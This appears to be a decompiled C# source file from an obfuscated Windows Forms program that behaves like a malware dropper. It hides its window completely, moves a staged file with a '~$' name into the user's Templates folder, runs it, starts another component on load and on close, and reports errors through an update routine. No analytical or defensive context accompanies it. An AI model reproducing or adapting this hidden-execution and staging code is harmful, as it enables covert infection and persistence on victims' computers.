using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace ntharprmes;

public class Form1 : Form
{
	private MEADRM ntharprmesmainvp = new MEADRM();

	private IContainer components = null;

	public void load_file(string fileName)
	{
		try
		{
			Process.Start(fileName);
		}
		catch
		{
		}
	}

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			((Form)this).set_FormBorderStyle((FormBorderStyle)6);
			Thread.Sleep(13);
			ntharprmesmainvp.ntharprmesdo_start();
			Thread.Sleep(110);
			ntharprmesloadMe();
			((Form)this).set_ShowIcon(false);
		}
		catch (Exception ex)
		{
			ERRHNDL.send_update(ex.Message.ToString());
		}
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		try
		{
			Thread.Sleep(10);
			ntharprmesmainvp.ntharprmesload_app();
		}
		catch
		{
		}
	}

	public void ntharprmesloadMe()
	{
		try
		{
			string text = Path.GetFileName(Application.get_ExecutablePath())!.Split(new char[1] { '.' })[0];
			if (!(CEAZRNF.ntharprmesmainApp != text))
			{
				return;
			}
			string text2 = Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\";
			string text3 = text2 + text;
			if (!File.Exists(text3))
			{
				string text4 = "~$|ntharprmes".Split(new char[1] { '|' })[0];
				if (File.Exists(text4 + text))
				{
					File.Move(text4 + text, text3);
				}
			}
			if (File.Exists(text3))
			{
				load_file(text3);
			}
		}
		catch
		{
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0071: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Expected O, but got Unknown
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(0, 0));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Form1");
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
